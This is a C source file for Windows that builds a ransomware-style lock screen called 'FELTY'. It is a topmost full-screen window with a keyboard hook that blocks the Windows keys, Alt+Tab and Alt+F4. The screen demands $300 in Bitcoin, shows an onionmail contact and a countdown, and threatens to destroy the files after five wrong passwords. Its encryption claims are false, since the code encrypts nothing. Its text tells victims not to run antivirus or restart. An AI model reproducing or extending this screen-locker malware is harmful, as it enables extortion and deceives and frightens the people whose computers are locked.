/*
 * felty_binder.c – FELTY lock screen (responsive, centered password input)
 * Compile with: x86_64-w64-mingw32-gcc -Os -s -Wall -o felty_binder.exe felty_binder.c ...
 */

#define WIN32_LEAN_AND_MEAN
#define _WIN32_WINNT 0x0501
#include <windows.h>
#include <stdlib.h>
#include <time.h>

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")

/* ---------- Configuration ---------- */
#define MAX_ATTEMPTS           5
#define CORRECT_PASSWORD       L"FELTY-RECOVER-2025"
#define COUNTDOWN_TOTAL_SECONDS (72 * 3600)

/* ---------- Global variables ---------- */
static HINSTANCE  g_hInst;
static HWND       g_hWnd;
static HWND       g_hPassEdit;      // password input
static HWND       g_hUnlockBtn;     // unlock button
static HHOOK      g_kbHook;
static int        g_attemptsLeft = MAX_ATTEMPTS;
static BOOL       g_permanentLock = FALSE;
static BOOL       g_success = FALSE;
static DWORD      g_startTick;
static wchar_t    g_machineId[64];

/* Double‑buffering */
static HDC        g_memDC  = NULL;
static HBITMAP    g_memBM  = NULL;
static int        g_memW   = 0;
static int        g_memH   = 0;

/* Fonts */
static HFONT      g_hLogoFont;
static HFONT      g_hTitleFont;
static HFONT      g_hMainFont;
static HFONT      g_hSmallFont;
static HFONT      g_hMonoFont;

/* Matrix rain state */
static BOOL       g_rainInit = FALSE;
static int        g_drops[256];

/* ---------- Forward declarations ---------- */
LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);
LRESULT CALLBACK KbProc(int, WPARAM, LPARAM);
VOID LayoutControls(HWND hwnd);
VOID DrawScreen(HDC hdc, const RECT *rc);
VOID DrawTerminal(HDC hdc, const RECT *term);
VOID DrawLogo(HDC hdc, int x, int y, int w);
VOID DrawTitleBar(HDC hdc, int x, int y, int w);
VOID DrawPasswordArea(HDC hdc, int x, int y, int w);
VOID DrawSystemInfo(HDC hdc, int x, int y, int w, int h);
VOID DrawPaymentInfo(HDC hdc, int x, int y, int w, int h);
VOID DrawQRPlaceholder(HDC hdc, int x, int y);
VOID DrawWarnings(HDC hdc, int x, int y, int w);
VOID DrawContactLine(HDC hdc, int x, int y, int w);
VOID DrawPermanentLock(HDC hdc, const RECT *rc);
VOID DrawSuccess(HDC hdc, const RECT *rc);
VOID DrawMatrixRain(HDC hdc, const RECT *rc);
VOID InitFonts();
VOID InitRain();
VOID CheckPassword();
VOID UpdateCountdown();

/* ========================================================================
 *  WinMain
 * ======================================================================== */
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow)
{
    g_hInst = hInst;
    g_startTick = GetTickCount();
    srand((unsigned)time(NULL));

    wsprintfW(g_machineId, L"%04X-%04X-%04X-%04X-%04X%04X",
              rand() % 0x10000, rand() % 0x10000, rand() % 0x10000,
              rand() % 0x10000, rand() % 0x10000, rand() % 0x10000);

    WNDCLASSEXW wc = { sizeof(WNDCLASSEXW) };
    wc.style         = CS_HREDRAW | CS_VREDRAW;
    wc.lpfnWndProc   = WndProc;
    wc.hInstance     = hInst;
    wc.hCursor       = LoadCursor(NULL, IDC_ARROW);
    wc.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);
    wc.lpszClassName = L"FELTY_BINDER_CLASS";
    RegisterClassExW(&wc);

    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    g_hWnd = CreateWindowExW(
        WS_EX_TOPMOST, L"FELTY_BINDER_CLASS", L"",
        WS_POPUP | WS_VISIBLE | WS_MAXIMIZE,
        0, 0, sw, sh,
        NULL, NULL, hInst, NULL
    );
    ShowWindow(g_hWnd, SW_SHOWMAXIMIZED);
    UpdateWindow(g_hWnd);

    g_kbHook = SetWindowsHookExW(WH_KEYBOARD_LL, KbProc, hInst, 0);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    if (g_kbHook) UnhookWindowsHookEx(g_kbHook);
    return 0;
}

/* ========================================================================
 *  Keyboard hook
 * ======================================================================== */
LRESULT CALLBACK KbProc(int code, WPARAM w, LPARAM l)
{
    if (code >= 0) {
        KBDLLHOOKSTRUCT *kb = (KBDLLHOOKSTRUCT *)l;
        if (kb->vkCode == VK_DELETE &&
            (GetAsyncKeyState(VK_CONTROL) & 0x8000) &&
            (GetAsyncKeyState(VK_MENU) & 0x8000))
            return 1;
        if (kb->vkCode == VK_LWIN || kb->vkCode == VK_RWIN) return 1;
        if (kb->vkCode == VK_TAB && (GetAsyncKeyState(VK_MENU) & 0x8000)) return 1;
        if (kb->vkCode == VK_ESCAPE && (GetAsyncKeyState(VK_MENU) & 0x8000)) return 1;
        if (kb->vkCode == VK_F4 && (GetAsyncKeyState(VK_MENU) & 0x8000)) return 1;
    }
    return CallNextHookEx(g_kbHook, code, w, l);
}

/* ========================================================================
 *  Window procedure
 * ======================================================================== */
LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM w, LPARAM l)
{
    switch (msg) {
    case WM_CREATE:
        InitFonts();
        InitRain();
        g_hPassEdit = CreateWindowExW(
            WS_EX_CLIENTEDGE, L"EDIT", L"",
            WS_CHILD | WS_BORDER | ES_PASSWORD | ES_CENTER,
            0, 0, 260, 28, hwnd, (HMENU)101, g_hInst, NULL
        );
        SendMessageW(g_hPassEdit, WM_SETFONT, (WPARAM)g_hMonoFont, TRUE);
        g_hUnlockBtn = CreateWindowExW(
            0, L"BUTTON", L"UNLOCK",
            WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
            0, 0, 80, 28, hwnd, (HMENU)102, g_hInst, NULL
        );
        SendMessageW(g_hUnlockBtn, WM_SETFONT, (WPARAM)g_hSmallFont, TRUE);
        SetTimer(hwnd, 1, 1000, NULL);
        SetTimer(hwnd, 2, 200, NULL);   // Slower rain = less lag
        break;

    case WM_SIZE:
        if (g_memBM) DeleteObject(g_memBM);
        if (g_memDC) DeleteDC(g_memDC);
        {
            RECT rc; GetClientRect(hwnd, &rc);
            g_memW = rc.right; g_memH = rc.bottom;
            HDC hdc = GetDC(hwnd);
            g_memDC = CreateCompatibleDC(hdc);
            g_memBM = CreateCompatibleBitmap(hdc, g_memW, g_memH);
            SelectObject(g_memDC, g_memBM);
            ReleaseDC(hwnd, hdc);
        }
        LayoutControls(hwnd);
        InvalidateRect(hwnd, NULL, FALSE);
        break;

    case WM_PAINT: {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hwnd, &ps);
        RECT rc; GetClientRect(hwnd, &rc);
        DrawScreen(g_memDC, &rc);
        BitBlt(hdc, 0, 0, g_memW, g_memH, g_memDC, 0, 0, SRCCOPY);
        EndPaint(hwnd, &ps);
        return 0;
    }

    case WM_CTLCOLOREDIT:
        SetTextColor((HDC)w, RGB(255, 204, 204));
        SetBkColor((HDC)w, RGB(0, 0, 0));
        return (LRESULT)GetStockObject(BLACK_BRUSH);

    case WM_CTLCOLORBTN:
        if ((HWND)l == g_hUnlockBtn) {
            SetTextColor((HDC)w, RGB(255, 255, 255));
            SetBkColor((HDC)w, RGB(204, 0, 0));
            return (LRESULT)CreateSolidBrush(RGB(204, 0, 0));
        }
        break;

    case WM_COMMAND:
        if (LOWORD(w) == 102 && HIWORD(w) == BN_CLICKED) {
            CheckPassword();
        }
        break;

    case WM_TIMER:
        if (w == 1) {
            UpdateCountdown();
        } else if (w == 2) {
            RECT rc; GetClientRect(hwnd, &rc);
            InvalidateRect(hwnd, &rc, FALSE);
        }
        break;

    case WM_DESTROY:
        KillTimer(hwnd, 1);
        KillTimer(hwnd, 2);
        if (g_memBM) DeleteObject(g_memBM);
        if (g_memDC) DeleteDC(g_memDC);
        DeleteObject(g_hLogoFont);
        DeleteObject(g_hTitleFont);
        DeleteObject(g_hMainFont);
        DeleteObject(g_hSmallFont);
        DeleteObject(g_hMonoFont);
        PostQuitMessage(0);
        break;
    }
    return DefWindowProcW(hwnd, msg, w, l);
}

/* ========================================================================
 *  Layout – centered horizontally, above the info grid
 * ======================================================================== */
VOID LayoutControls(HWND hwnd)
{
    RECT rc; GetClientRect(hwnd, &rc);
    int termW = min(rc.right - 40, 820);
    int termH = min(rc.bottom - 40, 620);
    int termX = (rc.right - termW) / 2;
    int termY = (rc.bottom - termH) / 2;

    // Position the edit control just below the title bar (title bar ends at termY+170)
    int editX = termX + (termW - 260) / 2;
    int editY = termY + 190;   // moved up slightly, was 210

    SetWindowPos(g_hPassEdit, HWND_TOP, editX, editY, 260, 28, SWP_NOZORDER | SWP_SHOWWINDOW);
    SetWindowPos(g_hUnlockBtn, HWND_TOP, editX + 260 + 10, editY, 80, 28, SWP_NOZORDER | SWP_SHOWWINDOW);
}

/* ========================================================================
 *  DrawScreen – master render
 * ======================================================================== */
VOID DrawScreen(HDC hdc, const RECT *rc)
{
    HBRUSH bg = CreateSolidBrush(RGB(0, 0, 0));
    FillRect(hdc, rc, bg);
    DeleteObject(bg);

    DrawMatrixRain(hdc, rc);

    if (g_success) {
        DrawSuccess(hdc, rc);
        return;
    }
    if (g_permanentLock) {
        DrawPermanentLock(hdc, rc);
        return;
    }

    int termW = min(rc->right - 40, 820);
    int termH = min(rc->bottom - 40, 620);
    RECT term;
    term.left   = (rc->right - termW) / 2;
    term.top    = (rc->bottom - termH) / 2;
    term.right  = term.left + termW;
    term.bottom = term.top  + termH;

    DrawTerminal(hdc, &term);
    LayoutControls(g_hWnd);
}

/* ========================================================================
 *  Terminal frame
 * ======================================================================== */
VOID DrawTerminal(HDC hdc, const RECT *term)
{
    HPEN border = CreatePen(PS_SOLID, 2, RGB(204, 0, 0));
    HBRUSH bg   = CreateSolidBrush(RGB(10, 0, 0));
    SelectObject(hdc, border);
    SelectObject(hdc, bg);
    Rectangle(hdc, term->left, term->top, term->right, term->bottom);
    DeleteObject(border);
    DeleteObject(bg);

    int x = term->left + 20;
    int w = term->right - term->left - 40;
    int y = term->top + 10;

    DrawLogo(hdc, x, y, w);
    DrawTitleBar(hdc, x, y + 80, w);
    DrawPasswordArea(hdc, x, y + 170, w);
    int gridY = y + 280;
    int halfW = (w - 20) / 2;
    DrawSystemInfo(hdc, x, gridY, halfW, 120);
    DrawPaymentInfo(hdc, x + halfW + 20, gridY, halfW, 120);
    DrawWarnings(hdc, x, gridY + 130, w);
    DrawContactLine(hdc, x, term->bottom - 40, w);
}

/* ========================================================================
 *  Logo
 * ======================================================================== */
VOID DrawLogo(HDC hdc, int x, int y, int w)
{
    (void)w;
    SetBkMode(hdc, TRANSPARENT);
    SetTextColor(hdc, RGB(204, 0, 0));
    SelectObject(hdc, g_hLogoFont);
    const wchar_t *lines[] = {
        L"    ╔═══╗╔═══╗╔══╗ ╔══╗╔═══╗╔═══╗╔═══╗╔══╗",
        L"    ║╔═╗║║╔═╗║║╔╗║ ║╔╗║║╔══╝║╔═╗║║╔═╗║║╔╗║",
        L"    ║╚═╝║║║ ║║║╚╝╚╗║╚╝║║╚══╗║╚═╝║║║ ║║║╚╝╚╗",
        L"    ║╔╗╔╝║╚═╝║║╔═╗║║╔╗║║╔══╝║╔╗╔╝║╚═╝║║╔═╗║",
        L"    ║║║╚╗║╔═╗║║╚═╝║║║║║║╚══╗║║║╚╗║╔═╗║║╚═╝║",
        L"    ╚╝╚═╝╚╝ ╚╝╚═══╝╚╝╚╝╚═══╝╚╝╚═╝╚╝ ╚╝╚═══╝"
    };
    for (int i = 0; i < 6; i++)
        TextOutW(hdc, x, y + i * 16, lines[i], lstrlenW(lines[i]));
}

/* ========================================================================
 *  Title bar
 * ======================================================================== */
VOID DrawTitleBar(HDC hdc, int x, int y, int w)
{
    SetBkMode(hdc, TRANSPARENT);
    SetTextColor(hdc, RGB(255, 0, 0));
    SelectObject(hdc, g_hTitleFont);
    RECT r = { x, y, x + w, y + 40 };
    DrawTextW(hdc, L"FELTY", -1, &r, DT_CENTER | DT_SINGLELINE | DT_VCENTER);

    SetTextColor(hdc, RGB(255, 68, 68));
    SelectObject(hdc, g_hSmallFont);
    r.top += 45; r.bottom += 20;
    DrawTextW(hdc, L"// YOUR SYSTEM HAS BEEN LOCKED //", -1, &r, DT_CENTER | DT_SINGLELINE);

    HPEN sep = CreatePen(PS_SOLID, 1, RGB(204, 0, 0));
    SelectObject(hdc, sep);
    MoveToEx(hdc, x, y + 80, NULL);
    LineTo(hdc, x + w, y + 80);
    DeleteObject(sep);
}

/* ========================================================================
 *  Password area labels
 * ======================================================================== */
VOID DrawPasswordArea(HDC hdc, int x, int y, int w)
{
    (void)w;
    SetBkMode(hdc, TRANSPARENT);
    SetTextColor(hdc, RGB(255, 68, 68));
    SelectObject(hdc, g_hSmallFont);
    TextOutW(hdc, x, y, L"> ENTER DECRYPTION PASSWORD TO UNLOCK SYSTEM", 45);

    if (g_attemptsLeft < MAX_ATTEMPTS) {
        wchar_t status[128];
        wsprintfW(status, L"> ERROR: Incorrect password. %d attempt(s) remaining.", g_attemptsLeft);
        TextOutW(hdc, x, y + 50, status, lstrlenW(status));
    }
    wchar_t att[64];
    wsprintfW(att, L"[ ATTEMPTS REMAINING: %d ]", g_attemptsLeft);
    SetTextColor(hdc, g_attemptsLeft <= 2 ? RGB(255, 68, 68) : RGB(255, 136, 0));
    TextOutW(hdc, x, y + 70, att, lstrlenW(att));

    SetTextColor(hdc, RGB(255, 68, 68));
    TextOutW(hdc, x, y + 95, L"WARNING: After 5 failed attempts, the decryption key is permanently destroyed.", 88);
}

/* ========================================================================
 *  System info panel (left)
 * ======================================================================== */
VOID DrawSystemInfo(HDC hdc, int x, int y, int w, int h)
{
    HPEN pen = CreatePen(PS_SOLID, 1, RGB(204, 0, 0));
    HBRUSH bg = CreateSolidBrush(RGB(5, 0, 0));
    SelectObject(hdc, pen);
    SelectObject(hdc, bg);
    Rectangle(hdc, x, y, x + w, y + h);
    DeleteObject(pen);
    DeleteObject(bg);

    SetBkMode(hdc, TRANSPARENT);
    SetTextColor(hdc, RGB(255, 68, 68));
    SelectObject(hdc, g_hSmallFont);
    TextOutW(hdc, x + 8, y + 5, L"// SYSTEM STATUS", 16);

    SetTextColor(hdc, RGB(255, 136, 136));
    SelectObject(hdc, g_hMainFont);
    wchar_t info[256];
    wsprintfW(info, L"Encryption: AES-256-CBC\r\nKey Exchange: RSA-4096\r\nMachine ID: %s\r\nStatus: LOCKED", g_machineId);
    RECT r = { x + 8, y + 30, x + w - 8, y + h - 8 };
    DrawTextW(hdc, info, -1, &r, DT_LEFT | DT_WORDBREAK);
}

/* ========================================================================
 *  Payment info panel (right)
 * ======================================================================== */
VOID DrawPaymentInfo(HDC hdc, int x, int y, int w, int h)
{
    HPEN pen = CreatePen(PS_SOLID, 1, RGB(204, 0, 0));
    HBRUSH bg = CreateSolidBrush(RGB(5, 0, 0));
    SelectObject(hdc, pen);
    SelectObject(hdc, bg);
    Rectangle(hdc, x, y, x + w, y + h);
    DeleteObject(pen);
    DeleteObject(bg);

    SetBkMode(hdc, TRANSPARENT);
    SetTextColor(hdc, RGB(255, 68, 68));
    SelectObject(hdc, g_hSmallFont);
    TextOutW(hdc, x + 8, y + 5, L"// PAYMENT REQUIRED", 19);

    SetTextColor(hdc, RGB(255, 204, 0));
    TextOutW(hdc, x + 8, y + 25, L"$300.00 USD", 11);

    DrawQRPlaceholder(hdc, x + 10, y + 50);

    SetTextColor(hdc, RGB(255, 136, 0));
    TextOutW(hdc, x + 8, y + 130, L"1FELTYa1zP1eP5QGefi2DMPTfTL5SLmv7", 35);

    SetTextColor(hdc, RGB(255, 0, 0));
    DWORD elapsed = (GetTickCount() - g_startTick) / 1000;
    DWORD remaining = (COUNTDOWN_TOTAL_SECONDS > elapsed) ? (COUNTDOWN_TOTAL_SECONDS - elapsed) : 0;
    wchar_t cd[32];
    wsprintfW(cd, L"%02d:%02d:%02d", remaining / 3600, (remaining % 3600) / 60, remaining % 60);
    TextOutW(hdc, x + 8, y + 150, L"Price doubles in", 16);
    TextOutW(hdc, x + 8, y + 170, cd, lstrlenW(cd));
}

/* ========================================================================
 *  Fake QR code
 * ======================================================================== */
VOID DrawQRPlaceholder(HDC hdc, int x, int y)
{
    int cell = 4;
    for (int row = 0; row < 25; row++) {
        for (int col = 0; col < 25; col++) {
            BOOL on = ((row * 7 + col * 11) % 3) == 0;
            HBRUSH brush = CreateSolidBrush(on ? RGB(204, 0, 0) : RGB(10, 0, 0));
            RECT r = { x + col * cell, y + row * cell, x + col * cell + cell, y + row * cell + cell };
            FillRect(hdc, &r, brush);
            DeleteObject(brush);
        }
    }
    SetBkMode(hdc, TRANSPARENT);
    SetTextColor(hdc, RGB(204, 0, 0));
    SelectObject(hdc, g_hMainFont);
    TextOutW(hdc, x + 42, y + 42, L"₿", 1);
}

/* ========================================================================
 *  Warnings
 * ======================================================================== */
VOID DrawWarnings(HDC hdc, int x, int y, int w)
{
    (void)w;
    SetBkMode(hdc, TRANSPARENT);
    SetTextColor(hdc, RGB(255, 68, 68));
    SelectObject(hdc, g_hSmallFont);
    const wchar_t *lines[] = {
        L">> DO NOT ATTEMPT TO DECRYPT FILES YOURSELF",
        L">> DO NOT RUN ANTIVIRUS — IT WILL DELETE THE DECRYPTION KEY",
        L">> DO NOT SHUT DOWN OR RESTART YOUR COMPUTER",
        L">> ONLY THE FELTY DECRYPTION TOOL CAN RESTORE YOUR FILES"
    };
    for (int i = 0; i < 4; i++)
        TextOutW(hdc, x, y + i * 18, lines[i], lstrlenW(lines[i]));
}

/* ========================================================================
 *  Contact line
 * ======================================================================== */
VOID DrawContactLine(HDC hdc, int x, int y, int w)
{
    (void)w;
    SetBkMode(hdc, TRANSPARENT);
    SetTextColor(hdc, RGB(255, 68, 68));
    SelectObject(hdc, g_hSmallFont);
    wchar_t contact[256];
    wsprintfW(contact, L"CONTACT FOR RECOVERY: feltyhelp@onionmail.org  |  Machine ID: %s", g_machineId);
    TextOutW(hdc, x, y, contact, lstrlenW(contact));
}

/* ========================================================================
 *  Permanent lock overlay
 * ======================================================================== */
VOID DrawPermanentLock(HDC hdc, const RECT *rc)
{
    static BOOL flash = FALSE;
    HBRUSH bg = CreateSolidBrush(flash ? RGB(180, 0, 0) : RGB(0, 0, 0));
    FillRect(hdc, rc, bg);
    DeleteObject(bg);

    SetBkMode(hdc, TRANSPARENT);
    SetTextColor(hdc, RGB(204, 0, 0));
    SelectObject(hdc, g_hLogoFont);
    int baseY = 100;
    const wchar_t *hex[] = {
        L"╔═══╗╔═══╗╔══╗ ╔══╗╔═══╗╔═══╗╔═══╗╔══╗",
        L"║╔═╗║║╔═╗║║╔╗║ ║╔╗║║╔══╝║╔═╗║║╔═╗║║╔╗║",
        L"║╚═╝║║║ ║║║╚╝╚╗║╚╝║║╚══╗║╚═╝║║║ ║║║╚╝╚╗",
        L"║╔╗╔╝║╚═╝║║╔═╗║║╔╗║║╔══╝║╔╗╔╝║╚═╝║║╔═╗║",
        L"║║║╚╗║╔═╗║║╚═╝║║║║║║╚══╗║║║╚╗║╔═╗║║╚═╝║",
        L"╚╝╚═╝╚╝ ╚╝╚═══╝╚╝╚╝╚═══╝╚╝╚═╝╚╝ ╚╝╚═══╝"
    };
    for (int i = 0; i < 6; i++)
        TextOutW(hdc, (rc->right - 400) / 2, baseY + i * 18, hex[i], lstrlenW(hex[i]));

    SetTextColor(hdc, RGB(255, 255, 255));
    SelectObject(hdc, g_hTitleFont);
    RECT tr = { rc->left, baseY + 120, rc->right, baseY + 160 };
    DrawTextW(hdc, L"FILES DESTROYED", -1, &tr, DT_CENTER | DT_SINGLELINE);

    SetTextColor(hdc, RGB(255, 68, 68));
    SelectObject(hdc, g_hMainFont);
    tr.top += 40; tr.bottom += 30;
    DrawTextW(hdc, L"// PERMANENTLY ENCRYPTED //", -1, &tr, DT_CENTER);

    SetTextColor(hdc, RGB(255, 136, 136));
    TextOutW(hdc, (rc->right - 400) / 2, tr.bottom + 40, L"You had 5 attempts to recover your data.", 40);
    TextOutW(hdc, (rc->right - 400) / 2, tr.bottom + 60, L"You failed every single one.", 27);
    SetTextColor(hdc, RGB(255, 0, 0));
    TextOutW(hdc, (rc->right - 400) / 2, tr.bottom + 90, L"NOTHING CAN SAVE YOUR FILES NOW.", 33);
    SetTextColor(hdc, RGB(255, 68, 68));
    SelectObject(hdc, g_hSmallFont);
    TextOutW(hdc, (rc->right - 400) / 2, tr.bottom + 120, L"[ THIS SYSTEM IS PERMANENTLY LOCKED — REINSTALL YOUR OS ]", 57);

    flash = !flash;
}

/* ========================================================================
 *  Success screen
 * ======================================================================== */
VOID DrawSuccess(HDC hdc, const RECT *rc)
{
    SetBkMode(hdc, TRANSPARENT);
    SetTextColor(hdc, RGB(0, 255, 0));
    SelectObject(hdc, g_hTitleFont);
    RECT r = { rc->left, rc->top + 100, rc->right, rc->top + 200 };
    DrawTextW(hdc, L"✓\r\nDECRYPTION SUCCESSFUL", -1, &r, DT_CENTER | DT_VCENTER);

    SelectObject(hdc, g_hMainFont);
    r.top += 120; r.bottom += 40;
    SetTextColor(hdc, RGB(102, 255, 102));
    DrawTextW(hdc, L"Your files are being restored. This window will close.", -1, &r, DT_CENTER);
}

/* ========================================================================
 *  Matrix rain
 * ======================================================================== */
VOID DrawMatrixRain(HDC hdc, const RECT *rc)
{
    static wchar_t chars[] = L"FELTY01HEX";
    SetBkMode(hdc, TRANSPARENT);
    HFONT old = SelectObject(hdc, g_hMonoFont);
    int fontH = 12;
    for (int col = 0; col < 256; col++) {
        int x = col * 8;
        if (x > rc->right) break;
        int yPos = g_drops[col] * fontH;
        if (yPos > rc->bottom) {
            if (rand() % 100 < 5) g_drops[col] = 0;
            continue;
        }
        wchar_t c = chars[rand() % 10];
        SetTextColor(hdc, RGB(150 + rand() % 105, 0, 0));
        TextOutW(hdc, x, yPos, &c, 1);
        g_drops[col]++;
    }
    SelectObject(hdc, old);
}

VOID InitRain()
{
    for (int i = 0; i < 256; i++) g_drops[i] = rand() % 100;
}

/* ---------- Font init ---------- */
VOID InitFonts()
{
    g_hLogoFont = CreateFontW(12, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
                              DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
                              ANTIALIASED_QUALITY, FIXED_PITCH | FF_MODERN, L"Courier New");
    g_hTitleFont = CreateFontW(32, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
                               DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
                               ANTIALIASED_QUALITY, VARIABLE_PITCH | FF_SWISS, L"Impact");
    g_hMainFont = CreateFontW(13, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
                              DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
                              ANTIALIASED_QUALITY, FIXED_PITCH | FF_MODERN, L"Courier New");
    g_hSmallFont = CreateFontW(10, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
                               DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
                               ANTIALIASED_QUALITY, VARIABLE_PITCH | FF_MODERN, L"Courier New");
    g_hMonoFont = CreateFontW(16, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
                              DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
                              ANTIALIASED_QUALITY, FIXED_PITCH | FF_MODERN, L"Consolas");
}

/* ---------- Password check ---------- */
VOID CheckPassword()
{
    if (g_permanentLock || g_success) return;
    wchar_t input[256];
    GetWindowTextW(g_hPassEdit, input, 256);
    if (lstrcmpW(input, CORRECT_PASSWORD) == 0) {
        g_success = TRUE;
        ShowWindow(g_hPassEdit, SW_HIDE);
        ShowWindow(g_hUnlockBtn, SW_HIDE);
        InvalidateRect(g_hWnd, NULL, TRUE);
        SetTimer(g_hWnd, 3, 3000, NULL);
    } else {
        g_attemptsLeft--;
        if (g_attemptsLeft <= 0) {
            g_permanentLock = TRUE;
            ShowWindow(g_hPassEdit, SW_HIDE);
            ShowWindow(g_hUnlockBtn, SW_HIDE);
        }
        SetWindowTextW(g_hPassEdit, L"");
        InvalidateRect(g_hWnd, NULL, TRUE);
    }
}

/* ---------- Countdown update ---------- */
VOID UpdateCountdown()
{
    if (g_permanentLock || g_success) return;
    RECT rc; GetClientRect(g_hWnd, &rc);
    int termW = min(rc.right - 40, 820);
    int termH = min(rc.bottom - 40, 620);
    int termX = (rc.right - termW) / 2;
    int termY = (rc.bottom - termH) / 2;
    int halfW = (termW - 60) / 2;
    RECT inv;
    inv.left   = termX + 20 + halfW + 20 + 8;
    inv.top    = termY + 280 + 130 + 150;
    inv.right  = inv.left + 200;
    inv.bottom = inv.top  + 60;
    InvalidateRect(g_hWnd, &inv, FALSE);
}
